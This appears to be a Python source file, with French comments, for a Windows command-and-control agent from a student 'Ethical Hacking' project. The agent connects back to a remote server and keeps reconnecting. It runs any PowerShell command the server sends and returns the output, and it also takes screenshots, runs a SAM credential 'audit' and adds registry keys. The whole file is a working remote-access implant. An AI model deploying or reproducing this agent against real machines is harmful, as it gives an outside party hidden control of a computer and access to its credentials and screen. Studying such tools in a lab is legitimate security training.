import argparse
import socket
import subprocess
import sys
import time
import json
import os

# --- CONFIGURATION DES CHEMINS ---
# On s'assure que Python trouve le dossier 'shared' et 'agents.windows' peu importe d'où on lance le script
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
sys.path.append(BASE_DIR)

from shared.protocol import *
from agents.windows import registry, sam_audit, security_audit

# --- 1. GESTION DES FLAGS ---
def parse_args():
    parser = argparse.ArgumentParser(description="Agent Windows - Projet Ethical Hacking")
    parser.add_argument("--ip", type=str, required=True, help="IP du serveur (ex: 192.168.1.10)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port du serveur (défaut: {DEFAULT_PORT})")
    parser.add_argument("--name", type=str, default="windows-agent", help="Nom de l'agent")
    return parser.parse_args()

# --- 2. RÉCUPÉRATION DES VRAIES IP ---
def get_real_ips():
    ips = []
    try:
        import psutil
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    ips.append(addr.address)
    except ImportError:
        hostname = socket.gethostname()
        ips = list(set(socket.gethostbyname_ex(hostname)[2]))
        ips = [ip for ip in ips if not ip.startswith("127.")]
    return ips

# --- 3. CONNEXION AU SERVEUR ---
def connect_to_server(server_ip, server_port, agent_name):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"[*] Connexion à {server_ip}:{server_port}...")
        client.connect((server_ip, server_port))
        
        my_ips = get_real_ips()
        print(f"[+] Connecté ! Mes IP : {my_ips}")
        
        hello_msg = hello(agent_name, "Windows", my_ips)
        client.sendall(encode_message(hello_msg))
        
        response = client.recv(MAX_MESSAGE_SIZE)
        if response:
            msg = decode_message(response)
            if msg.get("type") == MessageType.HELLO_ACK.value:
                print(f"[+] Serveur a validé la connexion (ID: {msg['data'].get('agent_id')})")
        
        return client
    except ConnectionRefusedError:
        print("[-] Erreur : Le serveur refuse la connexion. Est-il bien lancé ?")
        return None
    except Exception as e:
        print(f"[-] Erreur de connexion : {e}")
        return None

# --- 4. EXÉCUTION DES COMMANDES ---
def handle_message(client, msg):
    msg_type = msg.get("type")
    msg_id = msg.get("id")
    
    print(f"[*] Commande reçue : {msg_type}")
    
    if msg_type == MessageType.PING.value:
        client.sendall(encode_message(make_message(MessageType.PONG, msg_id=msg_id)))
        
    elif msg_type == MessageType.CMD.value:
        command = msg["data"].get("command", "")
        args = msg["data"].get("args", [])
        full_cmd = command + " " + " ".join(args) if args else command
        
        try:
            print(f"    -> Exécution : {full_cmd}")
            result_proc = subprocess.run(
                ["powershell", "-Command", full_cmd],
                capture_output=True, text=True, timeout=15
            )
            output = result_proc.stdout if result_proc.stdout else result_proc.stderr
            response = result({"output": output, "returncode": result_proc.returncode})
            response["id"] = msg_id
            client.sendall(encode_message(response))
            print("    -> Résultat envoyé.")
            
        except subprocess.TimeoutExpired:
            client.sendall(encode_message(error("La commande a pris trop de temps (Timeout).", "TIMEOUT")))
        except Exception as e:
            client.sendall(encode_message(error(f"Erreur d'exécution : {str(e)}")))

    elif msg_type == MessageType.SYSINFO.value:
        import platform
        info = f"OS: {platform.system()} {platform.release()}\nNom: {platform.node()}"
        response = result({"info": info})
        response["id"] = msg_id
        client.sendall(encode_message(response))
        
    elif msg_type == MessageType.SCREENSHOT.value:
        print("    -> Capture d'écran en cours...")
        shot_result = security_audit.take_screenshot()
        response = result(shot_result)
        response["id"] = msg_id
        client.sendall(encode_message(response))
        
    elif msg_type == MessageType.SAM_AUDIT.value:
        print("    -> Audit SAM en cours...")
        audit_result = sam_audit.audit_sam()
        response = result({"output": audit_result})
        response["id"] = msg_id
        client.sendall(encode_message(response))
        
    elif msg_type == MessageType.REGISTRY.value:
        print("    -> Ajout clé de registre...")
        reg_result = registry.add_registry_key()
        response = result({"output": reg_result})
        response["id"] = msg_id
        client.sendall(encode_message(response))
        
    else:
        client.sendall(encode_message(error(f"Commande non supportée: {msg_type}", "UNSUPPORTED")))

# --- 5. BOUCLE D'ÉCOUTE ---
def listen_for_commands(client):
    buffer = ""
    try:
        while True:
            data = client.recv(4096)
            if not data:
                print("[-] Le serveur a fermé la connexion.")
                break
            
            buffer += data.decode('utf-8')
            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                if not line.strip():
                    continue
                
                try:
                    msg = decode_message(line)
                    handle_message(client, msg)
                except ValueError as e:
                    print(f"[-] Message invalide reçu : {e}")
                    
    except ConnectionResetError:
        print("[-] Connexion interrompue par le serveur.")
    except KeyboardInterrupt:
        print("\n[*] Arrêt demandé par l'utilisateur.")
    finally:
        client.close()
        print("[*] Déconnecté.")

# --- 6. POINT D'ENTRÉE ---
if __name__ == "__main__":
    print("=== Agent Windows - Démarrage ===")
    args = parse_args()
    print(f"[*] Configuration : Serveur={args.ip}:{args.port} | Nom={args.name}")
    
    while True:
        client = connect_to_server(args.ip, args.port, args.name)
        if client:
            listen_for_commands(client)
        
        print("[*] Tentative de reconnexion dans 5 secondes...")
        time.sleep(5)